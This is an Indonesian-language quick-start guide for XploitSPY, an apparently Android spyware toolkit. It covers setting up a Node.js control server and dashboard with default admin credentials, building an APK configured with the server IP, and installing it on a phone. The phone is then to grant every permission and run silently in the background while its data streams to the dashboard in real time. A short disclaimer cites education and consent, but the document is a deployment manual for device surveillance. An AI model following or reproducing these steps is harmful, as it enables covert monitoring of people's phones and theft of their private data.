# Quick Start Guide

Panduan cepat untuk menjalankan XploitSPY.

## 1. Setup Server

```bash
# Install dependencies
cd server/
npm install

# Build web dashboard
cd ../web/
npm install
npm run build

# Start server dengan PM2
cd ../server/
pm2 start index.js
pm2 startup
pm2 save
```

## 2. Akses Dashboard

Buka browser dan akses:
```
http://YOUR_SERVER_IP
```

Login dengan:
- Username: `admin`
- Password: `password`

## 3. Build Android Client

### Menggunakan APK Builder

```bash
cd builder/
chmod +x build.sh
./build.sh
```

Masukkan IP server Anda, lalu build APK:

```bash
cd ../client/
./gradlew assembleRelease
```

APK akan tersedia di: `client/app/build/outputs/apk/release/`

### Manual Configuration

Edit file `client/app/src/main/java/com/xploitspy/client/Config.java`:

```java
public static final String SERVER_URL = "http://YOUR_SERVER_IP:80";
public static final String SOCKET_URL = "http://YOUR_SERVER_IP:80";
```

Lalu build APK dengan Android Studio atau Gradle.

## 4. Install di Android Device

1. Transfer APK ke device Android
2. Install APK (aktifkan "Install from Unknown Sources" jika perlu)
3. Berikan semua permissions yang diminta
4. Aplikasi akan berjalan di background

## 5. Monitor di Dashboard

1. Login ke dashboard
2. Perangkat yang terhubung akan muncul di daftar
3. Klik "View" untuk melihat detail perangkat
4. Data akan muncul secara real-time

## Troubleshooting

### Server tidak start
- Pastikan port 80 tidak digunakan aplikasi lain
- Cek log: `pm2 logs xploitspy`
- Pastikan Node.js terinstall dengan benar

### Dashboard tidak muncul
- Pastikan sudah build web: `cd web && npm run build`
- Cek apakah folder `web/dist/` ada dan berisi file

### Android client tidak connect
- Pastikan IP server benar di Config.java
- Pastikan device dan server dalam jaringan yang sama
- Cek firewall server

### Data tidak muncul
- Pastikan semua permissions diberikan di Android
- Cek koneksi internet device
- Lihat log Android dengan: `adb logcat | grep XploitSPY`

## Catatan Penting

⚠️ **DISCLAIMER**: 
- Aplikasi ini hanya untuk tujuan edukasi dan pengujian keamanan
- Penggunaan yang tidak sah adalah ilegal
- Selalu dapatkan persetujuan sebelum monitoring perangkat
- Ubah password default setelah instalasi pertama

